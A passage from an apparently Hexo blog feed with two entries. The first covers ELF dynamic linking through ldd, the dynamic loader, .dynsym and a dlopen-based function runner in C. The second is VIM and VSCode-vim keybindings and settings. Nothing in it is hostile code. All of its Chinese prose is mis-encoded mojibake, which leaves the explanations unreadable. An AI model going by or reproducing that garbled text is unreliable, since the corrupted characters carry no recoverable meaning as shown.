linked</span><br></pre></td></tr></table></figure><blockquote><p>å…³äºldd</p><p>lddå…¶å®æ˜¯ä¸€æ®µshellè„šæœ¬</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; file /usr/bin/ldd</span><br><span class="line">/usr/bin/ldd: Bourne-Again shell script, ASCII text executable</span><br></pre></td></tr></table></figure><p>ä»–ä¼šå°è¯•ä»ä¸‹é¢å‡ ä¸ªldå»è§£ææ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RTLDLIST=<span class="string">&quot;/lib/ld-linux.so.2 /lib64/ld-linux-x86-64.so.2 /libx32/ld-linux-x32.so.2&quot;</span></span><br></pre></td></tr></table></figure><p>ld ä¼šæœ‰å¦‚ä¸‹çš„é€‰é¡¹ï¼Œç”¨æ¥æ¨¡æ‹ŸåŠ è½½æ‰¾åˆ°ä¾èµ–ï¼Œä½†ä¸ä¼šæ‰§è¡Œæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--<span class="built_in">list</span>                <span class="built_in">list</span> all dependencies and how they are resolved</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ä¸‹é¢ä¼šå¾—åˆ°ç›¸åŒçš„ä¸œè¥¿ï¼Œç¨‹åºå¼€äº†pieæ‰€ä»¥åŠ è½½åœ°å€ä¼šä¸åŒ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; ldd a.out</span><br><span class="line">    linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffde81e7000</span>)</span><br><span class="line">    libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f68d5200000</span>)</span><br><span class="line">    /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f68d54ab000</span>)</span><br><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> --<span class="built_in">list</span> ./a.out</span><br><span class="line">    linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff141e7000</span>)</span><br><span class="line">    libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007efd08400000</span>)</span><br><span class="line">    /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007efd08773000</span>)</span><br></pre></td></tr></table></figure></blockquote><p>ä»–ä¹Ÿä¼šè¢«éšæœºæ˜ å°„åˆ°å†…å­˜ï¼Œæ‰€ä»¥ä»–ä¹Ÿä¼šæœ‰ä¸ªé‡å®šä½çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ç”±ä»–è‡ªå·±å®Œæˆï¼Œå«åšè‡ªä¸¾</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506091935404.png" alt="image-20230506091935404"></p><p>æ‰€ä»¥å¯¹äºåŠ¨æ€é“¾æ¥çš„ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿåœ¨å®Œæˆç¨‹åºæ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´åï¼Œä¸ä¼šå†åƒé™æ€é“¾æ¥çš„ç¨‹åºé‚£æ ·æŠŠæ§åˆ¶æƒç»™åˆ°ç¨‹åºçš„å…¥å£åœ°å€ï¼Œè€Œæ˜¯ç»™åˆ°åŠ¨æ€é“¾æ¥å™¨çš„è‡ªä¸¾ä»£ç å…¥å£ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®dynamicé‡Œä¿å­˜çš„ä¿¡æ¯å»åšç¬¦å·çš„æ•´åˆå’Œé‡å®šä½ï¼Œå¦‚æœåŠ¨æ€åº“æœ‰.initæˆ–.finitæ®µä¼šå»å…ˆæ‰§è¡Œè¿™äº›æ®µé‡Œçš„æŒ‡ä»¤(ä¾‹å¦‚c++é‡Œçš„å…¨å±€å¯¹è±¡çš„æ„é€ å’Œææ„å‡½æ•°)ï¼Œéšåæ‰æŠŠæ§åˆ¶æƒè½¬ç§»åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„å…¥å£å‡½æ•°</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠç¨‹åºç›´æ¥äº¤ç»™åŠ¨æ€é“¾æ¥å™¨ï¼Œä¹Ÿå¯ä»¥è·‘èµ·æ¥</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/D/s/i/nemu (pa1)&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>  ./a.out</span><br><span class="line">helloâ     </span><br></pre></td></tr></table></figure><h3 id="åŠ¨æ€ç¬¦å·è¡¨-dynsym"><a href="#åŠ¨æ€ç¬¦å·è¡¨-dynsym" class="headerlink" title="åŠ¨æ€ç¬¦å·è¡¨ .dynsym"></a>åŠ¨æ€ç¬¦å·è¡¨ .dynsym</h3><p>.symtabä¸€èˆ¬ä¿å­˜äº†æ‰€æœ‰ç¬¦å·ï¼Œ.dynsymåªä¿å­˜äº†åŠ¨æ€é“¾æ¥çš„ç¬¦å·ï¼Œæ•°æ®ç»“æ„ç”¨çš„æ˜¯ä¸€æ ·çš„ï¼Œ.dynsträ¿å­˜äº†åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -s xxx.so</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">16</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND b</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2<span class="number">.1</span><span class="number">.3</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND ext</span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses</span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable</span><br><span class="line">     <span class="number">8</span>: <span class="number">00002018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">22</span> _edata</span><br><span class="line">     <span class="number">9</span>: <span class="number">00000570</span>    <span class="number">50</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> bar</span><br><span class="line">    <span class="number">10</span>: <span class="number">00002020</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">23</span> x</span><br><span class="line">    <span class="number">11</span>: <span class="number">000005</span>a2    <span class="number">35</span> FUNC    GLOBAL DEFAULT   <span class="number">12</span> foo</span><br><span class="line">    <span class="number">12</span>: <span class="number">00002024</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">23</span> _end</span><br><span class="line">    <span class="number">13</span>: <span class="number">00002018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">23</span> __bss_start</span><br><span class="line">    <span class="number">14</span>: <span class="number">000003</span>d0     <span class="number">0</span> FUNC    GLOBAL DEFAULT    <span class="number">9</span> _init</span><br><span class="line">    <span class="number">15</span>: <span class="number">000005</span>cc     <span class="number">0</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> _fini</span><br></pre></td></tr></table></figure><h2 id="æ˜¾ç¤ºçš„è¿è¡Œæ—¶é“¾æ¥"><a href="#æ˜¾ç¤ºçš„è¿è¡Œæ—¶é“¾æ¥" class="headerlink" title="æ˜¾ç¤ºçš„è¿è¡Œæ—¶é“¾æ¥"></a>æ˜¾ç¤ºçš„è¿è¡Œæ—¶é“¾æ¥</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SETUP_STACK                                               \</span></span><br><span class="line"><span class="meta">    i = 2;                                                        \</span></span><br><span class="line"><span class="meta">    while (++i &lt; argc - 1) &#123;                                      \</span></span><br><span class="line"><span class="meta">        switch (argv[i][0]) &#123;                                     \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;i&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                asm volatile(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(atoi(&amp;argv[i][1]))); \</span></span><br><span class="line"><span class="meta">                esp += 4;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;d&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                atof(&amp;argv[i][1]);                                \</span></span><br><span class="line"><span class="meta">                asm volatile(                                     \</span></span><br><span class="line"><span class="meta">                    <span class="string">&quot;subl $8,%esp\n&quot;</span>                              \</span></span><br><span class="line"><span class="meta">                    <span class="string">&quot;fstpl (%esp)&quot;</span>);                              \</span></span><br><span class="line"><span class="meta">                esp += 8;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            case <span class="string">&#x27;s&#x27;</span>:                                             \</span></span><br><span class="line"><span class="meta">                asm volatile(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(&amp;argv[i][1]));       \</span></span><br><span class="line"><span class="meta">                esp += 4;                                         \</span></span><br><span class="line"><span class="meta">                break;                                            \</span></span><br><span class="line"><span class="meta">            default:                                              \</span></span><br><span class="line"><span class="meta">                printf(<span class="string">&quot;error argument type&quot;</span>);                    \</span></span><br><span class="line"><span class="meta">                goto exit_runso;                                  \</span></span><br><span class="line"><span class="meta">        &#125;                                                         \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RESTORE_STACK asm volatile(<span class="string">&quot;add %0,%%esp&quot;</span> ::<span class="string">&quot;r&quot;</span>(esp))</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="type">void</span>* handle;</span><br><span class="line">    <span class="type">char</span>* error;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> esp = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* func;</span><br><span class="line">    handle = dlopen(argv[<span class="number">1</span>], RTLD_NOW);</span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t find library: %s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    func = dlsym(handle, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> ((error = dlerror()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Find symbol %s error: %s\n&quot;</span>, argv[<span class="number">2</span>], error);</span><br><span class="line">        <span class="keyword">goto</span> exit_runso;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (argv[argc - <span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">int</span> (*func_int)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">int</span> ret = func_int();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">double</span> (*func_double)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">double</span> ret = func_double();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %f\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">char</span>* (*func_str)() = func;</span><br><span class="line">            SETUP_STACK;</span><br><span class="line">            <span class="type">char</span>* ret = func_str();</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = %s\n&quot;</span>, ret);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>: &#123;</span><br><span class="line">            <span class="type">void</span> (*func_void)() = func;</span><br><span class="line">            SETUP_STACK</span><br><span class="line">            <span class="title function_">func_void</span><span class="params">()</span>;</span><br><span class="line">            RESTORE_STACK;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ret = void&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  <span class="comment">// end of switch</span></span><br><span class="line">exit_runso:</span><br><span class="line">    dlclose(handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; gcc -m32 get.c -ldl</span><br><span class="line">get.c: In function â€˜mainâ€™:</span><br><span class="line">get.c:<span class="number">8</span>:<span class="number">46</span>: warning: implicit declaration of function â€˜atoiâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">                 <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;push %0&quot;</span> ::<span class="string">&quot;r&quot;</span>(atoi(&amp;argv[i][<span class="number">1</span>])))</span>; \</span><br><span class="line">                                              ^</span><br><span class="line">get.c:<span class="number">47</span>:<span class="number">13</span>: note: in expansion of macro â€˜SETUP_STACKâ€™</span><br><span class="line">             SETUP_STACK;</span><br><span class="line">             ^</span><br><span class="line">get.c:<span class="number">12</span>:<span class="number">17</span>: warning: implicit declaration of function â€˜atofâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">                 atof(&amp;argv[i][<span class="number">1</span>]);                                \</span><br><span class="line">                 ^</span><br><span class="line">get.c:<span class="number">47</span>:<span class="number">13</span>: note: in expansion of macro â€˜SETUP_STACKâ€™</span><br><span class="line">             SETUP_STACK;</span><br><span class="line">             ^</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; </span><br><span class="line">./a.out  /lib/i386-linux-gnu/libm<span class="number">-2.23</span>.so <span class="built_in">sin</span> d2<span class="number">.0</span> d</span><br><span class="line">ret = <span class="number">0.909297</span></span><br></pre></td></tr></table></figure><p>ç”±äºåº“é‡Œæœ‰éå¸¸å¤šçš„å‡½æ•°ï¼Œæˆ‘ä»¬ä¸å¯èƒ½ä¸ºæ¯ä¸€ä¸ªå‡½æ•°éƒ½å®šäºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¿™æ®µä»£ç æœ‰æ„æ€çš„ç‚¹åœ¨äºä»–æŠŠè¿”å›å€¼çš„æƒ…å†µéƒ½åˆ—äº†å‡ºæ¥ï¼Œç„¶åè°ƒç”¨ç©ºå‡½æ•°å‰è‡ªå·±å»ä¼ å‚ï¼Œè°ƒç”¨åè‡ªå·±å»å¹³æ ˆï¼Œå…¶ä¸­å®šä¹‰äº†å…¨å±€å˜é‡espæ¥è®°å½•éœ€è¦å¹³æ ˆçš„å¤§å°</p>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VIM</title>
      <link href="/2023/04/30/VIM/"/>
      <url>/2023/04/30/VIM/</url>
      
        <content type="html"><![CDATA[<h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>ç”¨æ¥å‡ å¤©vimå‘ç°è‡ªå·±å–œæ¬¢ä¸Šäº†vimçš„æ¨¡å¼ï¼ŒæŠŠæ‰€æœ‰ideèƒ½ç”¨vimæ’ä»¶çš„éƒ½æ”¹ç”¨vimäº† æ€»ä½“æ¥è¯´vscä½“éªŒæœ€å¥½ jetå…¨å®¶æ¡¶ideavimè¿˜å¯ä»¥ï¼Œvs2022 vimä½“éªŒå¹¶ä¸å¥½ï¼Œå¯èƒ½ä»¥åæ¢Clionäº†,ä½†æ˜¯æ„Ÿè§‰clionçš„è°ƒè¯•åŠŸèƒ½æ²¡æœ‰vs2022å¥½ï¼Œæ·¦ï¼Œè¿™ç§ä¸œè¥¿è‡ªå·±èˆ’æœæ‰æ˜¯æœ€é‡è¦çš„</p><h2 id="VSCODE-vim"><a href="#VSCODE-vim" class="headerlink" title="VSCODE vim"></a>VSCODE vim</h2><h3 id="nomalæ¨¡å¼"><a href="#nomalæ¨¡å¼" class="headerlink" title="nomalæ¨¡å¼"></a>nomalæ¨¡å¼</h3><p>aåœ¨å…‰æ ‡åæ’å…¥ Aåœ¨è¡Œå°¾æ’å…¥ è¿™æ ·æˆ‘ä»¬å¯ä»¥ç”¨A;å¾ˆæ–¹ä¾¿çš„åœ¨è¡Œå°¾åŠ åˆ†å·</p><p>iåœ¨å…‰æ ‡å‰æ’å…¥ Iåœ¨è¡Œé¦–æ’å…¥</p><p>oä¸‹è¡Œæ’å…¥ Oä¸Šè¡Œæ’å…¥</p><p>f {char}è·³åˆ°ä¸‹ä¸€ä¸ªcharä½ç½® F{char} ä¸Šä¸€ä¸ª</p><p>; é‡å¤ä¸Šæ¬¡å­—ç¬¦æŸ¥æ‰¾  ,åå‘æŸ¥æ‰¾ä¸Šæ¬¡æŸ¥æ‰¾ .å¯ä»¥é‡å¤ä¸Šä¸€æ¬¡å‘½ä»¤</p><p>d åˆ é™¤(å‰ªåˆ‡) cä¿®æ”¹ yå¤åˆ¶ pç²˜è´´ uæ’¤é”€ </p><p>xåˆ é™¤å…‰æ ‡å¤„ï¼Œrä¿®æ”¹å…‰æ ‡å¤„</p><p>&#x3D;&#x3D;è‡ªåŠ¨ç¼©è¿›</p><p><em>â€œ Ctrl-u å‘ä¸Šç§»åŠ¨åŠå±</em></p><p><em>â€œ Ctrl-d å‘ä¸‹ç§»åŠ¨åŠå±</em></p><p><em>â€œ Ctrl-b å‘ä¸Šç§»åŠ¨ä¸€å±</em></p><p><em>â€œ Ctrl-f å‘ä¸‹ç§»åŠ¨ä¸€å±</em></p><p><em>â€œ gg åˆ°æ–‡æ¡£å¼€å¤´</em></p><p><em>â€œ G åˆ°æ–‡æ¡£ç»“å°¾</em></p><p><em>â€œ H åˆ°å±å¹•é¡¶éƒ¨</em> head</p><p><em>â€œ M åˆ°å±å¹•ä¸­é—´ middle</em></p><p><em>â€œ L åˆ°å±å¹•åº•éƒ¨ last</em></p><p>â€œayy å¤åˆ¶å½“å‰è¡Œåˆ°aå¯„å­˜å™¨ä¸­</p><p>â€œAyy è¿½åŠ å½“å‰å½“åˆ°aå¯„å­˜å™¨.</p><p>â€œap ç²˜è´´aå¯„å­˜å™¨ä¸­çš„å€¼</p><p><num> jå’Œ<num> kè·³è½¬ç›¸å¯¹numè¡Œ</num></num></p><h4 id="å…‰æ ‡ç§»åŠ¨"><a href="#å…‰æ ‡ç§»åŠ¨" class="headerlink" title="å…‰æ ‡ç§»åŠ¨"></a>å…‰æ ‡ç§»åŠ¨</h4><p><img src="/2023/04/30/VIM/image-20230430152911270.png" alt="image-20230430152911270"></p><p>w ä¸‹ä¸€ä¸ªå•è¯å¼€å¤´</p><p>b æœ¬å•è¯æˆ–è€…ä¸Šä¸€ä¸ªå•è¯å¼€å¤´(back)</p><p>e æœ¬å•è¯æˆ–ä¸‹ä¸€ä¸ªå•è¯ç»“å°¾(end)</p><p>0 ç»å¯¹è¡Œé¦– ^è¡Œé¦– $è¡Œå°¾</p><p>gg ç¬¬ä¸€è¡Œ Gæœ€åä¸€è¡Œ</p><h4 id="ç»„åˆ"><a href="#ç»„åˆ" class="headerlink" title="ç»„åˆ"></a>ç»„åˆ</h4><p>aæ˜¯around iæ˜¯inner æ ‡è¯†ç¬¦:() &lt;&gt; {} ç­‰</p><p>c&#x2F;d&#x2F;y iwæ“ä½œä¸€ä¸ªçš„å•è¯</p><p>c&#x2F;d&#x2F;y iæ ‡è¯†ç¬¦ æ“ä½œè¢«ç¬¦å·åŒ…è£¹ç€çš„å•è¯</p><p>c&#x2F;d&#x2F;y aæ ‡ç¤ºç¬¦ è¿åŒç¬¦å·ä¸€èµ·æ“ä½œ</p><p>å¯¹äºå¤§æ‹¬å·{}é‡Œçš„è¯­å¥è¿˜å¯ä»¥ç”¨c&#x2F;d&#x2F;y iBæˆ–c&#x2F;d&#x2F;y aBæ¥æ“ä½œ</p><p>å¯¹äºå°æ‹¬å·()é‡Œçš„è¯­å¥å¯ä»¥ç”¨c&#x2F;d&#x2F;y ibæˆ–c&#x2F;d&#x2F;y abæ¥æ“ä½œ</p><p>dd yy ccæ“ä½œä¸€è¡Œ å‰é¢åŠ æ•°å­—å°±å¯ä»¥æ“ä½œnè¡Œ</p><p>c&#x2F;d&#x2F;y f {char}ä¸€ç›´æ“ä½œåˆ°char</p><p>c&#x2F;d&#x2F;y iæˆ–a eæ“ä½œæ•´ä¸ªæ–‡ä»¶</p><p>ä¸Šé¢çš„è¿˜å¯ä»¥è‡ªç”±æ­é…æ¯”å¦‚deä»€ä¹ˆçš„</p><h3 id="VISUALæ¨¡å¼"><a href="#VISUALæ¨¡å¼" class="headerlink" title="VISUALæ¨¡å¼"></a>VISUALæ¨¡å¼</h3><p>å¤§åŒå°å¼‚</p><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>gd è½¬åˆ°å‡½æ•°å®šä¹‰ (goto defination)</p><p>gh æŸ¥çœ‹å‚æ•°æç¤ºç­‰ (hoveræ‚¬åœ)</p><p>ctrl+ræˆ–è€…:redoæ¥æ’¤å›è¯¯æ’¤å›</p><p>:tabnæˆ–g tåˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ª(next)æ ‡ç­¾ :tabp æˆ–g Tåˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªæ ‡ç­¾(prev)</p><p>æŠŠå®ƒæ”¹åˆ°äº†JKæ–¹ä¾¿åˆ‡æ¢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;vim.easymotion&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.incsearch&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.useSystemClipboard&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.useCtrlKeys&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.hlsearch&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.sneak&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.insertModeKeyBindings&quot;</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>],</span><br><span class="line">    <span class="string">&quot;after&quot;</span>: [<span class="string">&quot;&lt;Esc&gt;&quot;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;vim.normalModeKeyBindingsNonRecursive&quot;</span>: [</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;leader&gt;&quot;</span>, <span class="string">&quot;d&quot;</span>],</span><br><span class="line">    <span class="string">&quot;after&quot;</span>: [<span class="string">&quot;d&quot;</span>, <span class="string">&quot;d&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;C-n&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;:nohl&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;K&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;lineBreakInsert&quot;</span>],</span><br><span class="line">    <span class="string">&quot;silent&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;S-K&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;:tabnext&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;S-J&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;:tabprevious&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>: [<span class="string">&quot;&lt;S-Q&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;commands&quot;</span>: [<span class="string">&quot;:q!&quot;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;vim.leader&quot;</span>: <span class="string">&quot;&lt;space&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;vim.handleKeys&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;&lt;C-a&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-f&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-z&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-v&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-c&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-x&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;&lt;C-w&gt;&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;vim.highlightedyank.enable&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.showMarksInGutter&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.smartRelativeLine&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;vim.sneakReplacesF&quot;</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>ctrl oå›åˆ°å…‰æ ‡çš„ä¸Šæ¬¡ï¼Œctrl + iä¸‹æ¬¡å…‰æ ‡ä½ç½®ã€</p><p>gccç»™å½“å‰è¡Œæ·»åŠ æ³¨é‡Š gc3jåŒ…æ‹¬å½“å‰è¡Œ4è¡Œæ·»åŠ æ³¨é‡Š gciB gcaBç­‰å¯ä»¥è‡ªå·±æ­é…</p><table><thead><tr><th><code>y s &lt;motion&gt; &lt;desired&gt;</code></th><th>Add <code>desired</code> surround around text defined by <code>&lt;motion&gt;</code></th></tr></thead><tbody><tr><td><code>d s &lt;existing&gt;</code></td><td>Delete <code>existing</code> surround</td></tr><tr><td><code>c s &lt;existing&gt; &lt;desired&gt;</code></td><td>Change <code>existing</code> surround to <code>desired</code></td></tr></tbody></table><table><thead><tr><th><code>S &lt;desired&gt;</code></th><th>Surround when in visual modes (surrounds full selection)</th></tr></thead><tbody><tr><td></td><td>è¿™æ ·å°±å¯ä»¥ç”¨vawæ–¹ä¾¿çš„ Så¼•å· æ–¹ä¾¿çš„ç»™ä¸€ä¸ªå•è¯åŠ ä¸Šå¼•å·</td></tr></tbody></table><p> ç„¶åæˆ‘æŠŠè¿™ä¸ªæ’ä»¶â€vim.sneakâ€: trueæ‰“å¼€äº† s<char><char>å¯ä»¥å‘å‰è·³åˆ°char char</char></char></p><p>S<char><char>å¯ä»¥å‘åè·³åˆ°char charåˆ†å·è·³åˆ°ä¸‹ä¸€ä¸ªåŸæœ¬çš„sæ˜¯åˆ 